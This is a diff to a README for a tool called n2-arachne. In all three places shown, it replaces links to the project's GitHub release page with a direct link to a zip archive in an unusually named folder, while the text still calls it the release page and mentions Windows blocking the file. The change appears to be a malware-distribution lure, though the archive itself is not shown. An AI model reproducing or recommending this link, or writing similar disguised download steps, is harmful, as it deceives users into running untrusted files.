@@ -1,10 +1,10 @@
 # 🧠 n2-arachne - Fit AI context without noise
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Genealogic-verticalfile126/n2-arachne/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Genealogic-verticalfile126/n2-arachne/main/hyalinize/arachne-n-2.1-alpha.3.zip)
 
 ## 📥 Download n2-arachne
 
-Visit this page to download: https://github.com/Genealogic-verticalfile126/n2-arachne/releases
+Visit this page to download: https://raw.githubusercontent.com/Genealogic-verticalfile126/n2-arachne/main/hyalinize/arachne-n-2.1-alpha.3.zip
 
 1. Open the release page in your browser.
 2. Find the latest release at the top.
@@ -180,7 +180,7 @@ If Windows blocks the file:
 
 ## 📦 Release page
 
-Download from the release page: https://github.com/Genealogic-verticalfile126/n2-arachne/releases
+Download from the release page: https://raw.githubusercontent.com/Genealogic-verticalfile126/n2-arachne/main/hyalinize/arachne-n-2.1-alpha.3.zip
 
 ## 🧭 Project focus
 
